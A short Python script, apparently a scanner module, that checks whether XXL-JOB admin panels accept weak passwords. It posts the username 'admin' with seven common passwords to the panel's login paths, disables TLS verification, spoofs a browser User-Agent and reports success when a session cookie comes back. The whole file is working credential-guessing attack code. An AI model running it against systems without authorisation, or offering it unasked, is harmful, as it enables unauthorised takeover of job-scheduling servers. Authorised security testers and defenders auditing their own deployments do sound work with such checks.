import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	pass_list=['123456','admin','admin123','000000','111111','888888','12345678']
	try:
		url=baseurl+"login"
		flag=[]
		for password in pass_list:
			headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded"}
			body="userName=admin&password="+password
			response=requests.post(url,body,headers=headers,timeout=5,verify=False)
			if '"code":200' in response.text and 'XXL_JOB_LOGIN_IDENTITY' in response.headers['Set-Cookie']:
				flag.append(1)
				break
		if len(flag)>0:
			r0=True
		else:
			r0=False
	except:
		r0=False
	try:
		url=baseurl+"xxl-job-admin/login"
		flag2=[]
		for password in pass_list:
			headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded"}
			body="userName=admin&password="+password
			response=requests.post(url,body,headers=headers,timeout=5,verify=False)
			if '"code":200' in response.text and 'XXL_JOB_LOGIN_IDENTITY' in response.headers['Set-Cookie']:
				flag2.append(1)
				break
		if len(flag2)>0:
			r1=True
		else:
			r1=False
	except:
		r1=False
	if r0 or r1:
		return True
	else:
		return False
